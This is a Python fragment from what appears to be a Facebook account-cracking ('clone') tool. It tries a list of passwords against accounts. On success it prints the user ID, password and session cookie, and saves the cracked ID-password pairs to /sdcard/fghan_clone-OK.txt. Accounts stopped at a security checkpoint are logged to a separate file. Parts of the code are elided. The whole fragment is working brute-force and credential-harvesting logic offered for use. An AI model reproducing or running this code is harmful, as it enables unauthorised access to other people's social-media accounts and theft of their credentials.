    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32m[fghan_clone-OK]  ' +cid+ ' | ' +ps+'  \n \033[1;33m COOKIE = \033[1;32m'+coki+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/fghan_clone-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\33[1;30m[fghan_clone-CPðŸ¤•]  ' +cid+ ' | ' +ps+'  \33[0;97m')
                open('/sdcard/fghan_clone-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s[fghan_clone] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
